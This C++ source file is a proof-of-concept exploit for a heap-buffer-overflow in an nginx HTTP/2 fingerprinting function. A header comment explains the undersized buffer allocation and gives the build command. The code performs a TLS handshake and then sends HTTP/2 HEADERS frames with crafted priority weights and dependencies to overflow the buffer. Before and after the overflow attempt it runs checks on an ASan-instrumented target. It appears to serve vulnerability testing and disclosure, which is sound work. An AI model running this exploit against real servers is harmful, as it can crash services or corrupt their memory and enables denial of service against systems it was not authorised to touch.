/*
 * PoC: HTTP/2 fingerprint heap-buffer-overflow via crafted PRIORITY weights.
 *
 * Bug: ngx_http2_fingerprint() allocates fp_priorities.len * 2 bytes for the
 * priorities section, but each 4-byte record expands to up to 16 characters
 * (e.g. "255:255:255:256,").  With weight >= 101 and/or dependency >= 100 the
 * output overflows.
 *
 * Uses Botan for TLS 1.2 + libnghttp2 for HTTP/2 framing.
 * Sends HEADERS frames with high priority weight to fill fp_priorities[],
 * then triggers $http2_fingerprint evaluation via access_log.
 *
 * Against nginx-asan: produces a heap-buffer-overflow report.
 *
 * Build:  g++ -std=c++17 -O2 -Wall -o test_h2_overflow test_h2_overflow.cpp \
 *           $(pkg-config --cflags --libs botan-2 libnghttp2)
 */

#include <cerrno>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>
#include <stdexcept>
#include <functional>

#include <netdb.h>
#include <sys/socket.h>
#include <unistd.h>

#include <botan/auto_rng.h>
#include <botan/credentials_manager.h>
#include <botan/tls_callbacks.h>
#include <botan/tls_client.h>
#include <botan/tls_policy.h>
#include <botan/tls_session_manager.h>

#include <nghttp2/nghttp2.h>

/* ---- Botan TLS callbacks ---- */

class H2_Callbacks : public Botan::TLS::Callbacks {
public:
    explicit H2_Callbacks(int fd) : m_fd(fd) {}

    void tls_emit_data(const uint8_t data[], size_t size) override {
        const uint8_t *p = data;
        size_t left = size;
        while (left > 0) {
            ssize_t n = ::send(m_fd, p, left, 0);
            if (n <= 0)
                throw std::runtime_error("send failed");
            p += n;
            left -= static_cast<size_t>(n);
        }
    }

    void tls_record_received(uint64_t, const uint8_t data[], size_t size) override {
        m_received.insert(m_received.end(), data, data + size);
    }

    void tls_alert(Botan::TLS::Alert alert) override {
        if (alert.type() != Botan::TLS::Alert::CLOSE_NOTIFY)
            fprintf(stderr, "TLS alert: %s\n", alert.type_string().c_str());
    }

    bool tls_session_established(const Botan::TLS::Session &) override {
        m_handshake_done = true;
        return true;
    }

    void tls_verify_cert_chain(
        const std::vector<Botan::X509_Certificate> &,
        const std::vector<std::shared_ptr<const Botan::OCSP::Response>> &,
        const std::vector<Botan::Certificate_Store *> &,
        Botan::Usage_Type, const std::string &,
        const Botan::TLS::Policy &) override {}

    bool handshake_done() const { return m_handshake_done; }

    /* drain received application data */
    std::vector<uint8_t> take_received() {
        std::vector<uint8_t> r;
        r.swap(m_received);
        return r;
    }

private:
    int m_fd;
    bool m_handshake_done = false;
    std::vector<uint8_t> m_received;
};

class H2_Policy : public Botan::TLS::Policy {
public:
    std::vector<std::string> allowed_ciphers() const override {
        return {"AES-256/GCM", "AES-128/GCM", "AES-256", "AES-128"};
    }
    std::vector<std::string> allowed_key_exchange_methods() const override {
        return {"ECDH", "DH", "RSA"};
    }
    std::vector<std::string> allowed_signature_methods() const override {
        return {"RSA", "ECDSA"};
    }
    std::vector<std::string> allowed_macs() const override {
        return {"AEAD", "SHA-256", "SHA-384", "SHA-1"};
    }
    bool allow_tls12() const override { return true; }
    bool require_cert_revocation_info() const override { return false; }
    size_t minimum_rsa_bits() const override { return 1024; }
    bool acceptable_protocol_version(Botan::TLS::Protocol_Version v) const override {
        return v == Botan::TLS::Protocol_Version::TLS_V12;
    }
};

class Null_Credentials : public Botan::Credentials_Manager {
public:
    std::vector<Botan::Certificate_Store *>
    trusted_certificate_authorities(const std::string &, const std::string &) override {
        return {};
    }
};

/* ---- network helpers ---- */

static int tcp_connect(const char *host, int port) {
    struct addrinfo hints = {}, *res;
    char port_str[16];
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    snprintf(port_str, sizeof(port_str), "%d", port);
    if (getaddrinfo(host, port_str, &hints, &res) != 0) return -1;
    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) { freeaddrinfo(res); return -1; }
    struct timeval tv = {5, 0};
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        close(fd); freeaddrinfo(res); return -1;
    }
    freeaddrinfo(res);
    return fd;
}

static int wait_for_server(const char *host, int port, int max_wait) {
    printf("Waiting for %s:%d ", host, port);
    fflush(stdout);
    for (int i = 0; i < max_wait; i++) {
        int fd = tcp_connect(host, port);
        if (fd >= 0) { close(fd); printf(" up\n"); return 0; }
        printf("."); fflush(stdout); sleep(1);
    }
    printf(" TIMEOUT\n");
    return -1;
}

/* ---- nghttp2 callbacks ---- */

struct H2_Session {
    Botan::TLS::Client *tls;
    H2_Callbacks       *callbacks;
    int                 fd;
    bool                response_received;
    std::string         response_status;
};

static ssize_t
h2_send_cb(nghttp2_session *, const uint8_t *data, size_t length,
           int, void *user_data)
{
    auto *s = static_cast<H2_Session *>(user_data);
    s->tls->send(data, length);
    return static_cast<ssize_t>(length);
}

static int
h2_on_header_cb(nghttp2_session *, const nghttp2_frame *frame,
                const uint8_t *name, size_t namelen,
                const uint8_t *value, size_t valuelen,
                uint8_t, void *user_data)
{
    auto *s = static_cast<H2_Session *>(user_data);
    if (frame->hd.type == NGHTTP2_HEADERS &&
        namelen == 7 && memcmp(name, ":status", 7) == 0) {
        s->response_status = std::string(reinterpret_cast<const char *>(value), valuelen);
    }
    return 0;
}

static int
h2_on_frame_recv_cb(nghttp2_session *, const nghttp2_frame *frame,
                    void *user_data)
{
    auto *s = static_cast<H2_Session *>(user_data);
    if (frame->hd.type == NGHTTP2_HEADERS &&
        (frame->hd.flags & NGHTTP2_FLAG_END_HEADERS)) {
        s->response_received = true;
    }
    return 0;
}

/*
 * Run one test: TLS handshake, then HTTP/2 with crafted priority weights.
 */
static int
run_test(const char *host, int port, int num_streams, uint8_t weight,
         uint32_t depend, const char *label)
{
    char url[256];
    snprintf(url, sizeof(url), "/%s", label);

    printf("  [%s] %d streams, weight=%u, depend=%u ... ",
           label, num_streams, (unsigned)weight, depend);
    fflush(stdout);

    int fd = tcp_connect(host, port);
    if (fd < 0) { printf("SKIP (connect failed)\n"); return -1; }

    try {
        /* TLS handshake */
        Botan::AutoSeeded_RNG rng;
        Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
        Null_Credentials creds;
        H2_Policy policy;
        H2_Callbacks tls_cb(fd);

        Botan::TLS::Client tls_client(
            tls_cb, session_mgr, creds, policy, rng,
            Botan::TLS::Server_Information(host, static_cast<uint16_t>(port)),
            Botan::TLS::Protocol_Version::TLS_V12,
            {"h2"} /* ALPN: request HTTP/2 */
        );

        uint8_t buf[16384];
        while (!tls_cb.handshake_done()) {
            ssize_t n = ::recv(fd, buf, sizeof(buf), 0);
            if (n <= 0) break;
            tls_client.received_data(buf, static_cast<size_t>(n));
        }
        if (!tls_cb.handshake_done()) {
            printf("TLS handshake failed\n");
            close(fd); return -1;
        }

        /* HTTP/2 session */
        nghttp2_session_callbacks *h2cbs;
        nghttp2_session_callbacks_new(&h2cbs);
        nghttp2_session_callbacks_set_send_callback(h2cbs, h2_send_cb);
        nghttp2_session_callbacks_set_on_header_callback(h2cbs, h2_on_header_cb);
        nghttp2_session_callbacks_set_on_frame_recv_callback(h2cbs, h2_on_frame_recv_cb);

        H2_Session h2s;
        h2s.tls = &tls_client;
        h2s.callbacks = &tls_cb;
        h2s.fd = fd;
        h2s.response_received = false;

        nghttp2_session *session;
        nghttp2_session_client_new(&session, h2cbs, &h2s);
        nghttp2_session_callbacks_del(h2cbs);

        /* send connection preface + SETTINGS */
        nghttp2_settings_entry settings[] = {
            {NGHTTP2_SETTINGS_MAX_CONCURRENT_STREAMS, 100},
            {NGHTTP2_SETTINGS_INITIAL_WINDOW_SIZE, 65535},
        };
        nghttp2_submit_settings(session, NGHTTP2_FLAG_NONE,
                                settings, sizeof(settings) / sizeof(settings[0]));

        /*
         * Send HEADERS frames with crafted priority.
         * nginx captures priority from HEADERS: stream_id, excl, depend, weight-1.
         * We set high weight and dependency to get 3-digit values in output.
         */
        for (int i = 0; i < num_streams; i++) {
            nghttp2_priority_spec pri_spec;
            nghttp2_priority_spec_init(&pri_spec, depend, weight, 0 /* excl */);

            /* build :path for each stream */
            char path[256];
            if (i == 0)
                snprintf(path, sizeof(path), "%s", url);
            else
                snprintf(path, sizeof(path), "%s-%d", url, i);

            nghttp2_nv hdrs[] = {
                {(uint8_t *)":method",    (uint8_t *)"GET",       7, 3, NGHTTP2_NV_FLAG_NONE},
                {(uint8_t *)":scheme",    (uint8_t *)"https",     7, 5, NGHTTP2_NV_FLAG_NONE},
                {(uint8_t *)":authority", (uint8_t *)host,        10, strlen(host), NGHTTP2_NV_FLAG_NONE},
                {(uint8_t *)":path",      (uint8_t *)path,        5, strlen(path), NGHTTP2_NV_FLAG_NONE},
            };

            nghttp2_submit_request(session, &pri_spec,
                                   hdrs, sizeof(hdrs) / sizeof(hdrs[0]),
                                   NULL, NULL);
        }

        /* flush all pending frames */
        nghttp2_session_send(session);

        /* read responses */
        for (int attempt = 0; attempt < 20 && !h2s.response_received; attempt++) {
            ssize_t n = ::recv(fd, buf, sizeof(buf), 0);
            if (n <= 0) break;
            tls_client.received_data(buf, static_cast<size_t>(n));
            auto app_data = tls_cb.take_received();
            if (!app_data.empty()) {
                nghttp2_session_mem_recv(session, app_data.data(), app_data.size());
                nghttp2_session_send(session); /* send any pending frames (e.g. window updates) */
            }
        }

        if (!h2s.response_status.empty())
            printf("handshake OK, HTTP/2 status: %s\n", h2s.response_status.c_str());
        else
            printf("handshake OK, no response\n");

        nghttp2_session_del(session);
        try { tls_client.close(); } catch (...) {}

    } catch (const std::exception &e) {
        printf("ERROR: %s\n", e.what());
        close(fd); return -1;
    }

    close(fd);
    return 0;
}


int
main(int argc, char *argv[])
{
    const char *host = getenv("NGINX_HOST");
    if (!host) host = "nginx-asan";
    if (argc > 1) host = argv[1];

    int port = 8443;
    if (getenv("NGINX_PORT"))
        port = atoi(getenv("NGINX_PORT"));
    if (argc > 2)
        port = atoi(argv[2]);

    printf("=== H2 fingerprint buffer overflow PoC ===\n");
    printf("Target: %s:%d\n\n", host, port);

    if (wait_for_server(host, port, 30) != 0) {
        fprintf(stderr, "ERROR: server not reachable\n");
        return 1;
    }

    printf("\n--- Test 0: vanilla H2 (low weight) ---\n");
    printf("  Expected: safe, no overflow\n");
    run_test(host, port, 3, 16, 0, "h2-vanilla");

    usleep(300000);

    printf("\n--- Test 1: trigger (8 streams, weight=255, depend=200) ---\n");
    printf("  Expected: heap-buffer-overflow on buggy code (*2)\n");
    run_test(host, port, 8, 255, 200, "h2-overflow");

    usleep(300000);

    printf("\n--- Test 2: verify server still alive ---\n");
    run_test(host, port, 1, 16, 0, "h2-alive");

    printf("\n=== Done ===\n");
    printf("Check nginx-asan logs for AddressSanitizer errors.\n");

    return 0;
}
